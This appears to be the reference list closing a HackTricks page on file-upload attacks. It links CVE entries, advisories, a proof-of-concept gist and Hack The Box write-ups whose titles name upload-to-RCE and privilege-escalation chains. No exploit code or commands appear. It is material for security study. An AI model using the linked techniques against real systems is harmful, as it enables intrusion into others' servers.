- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
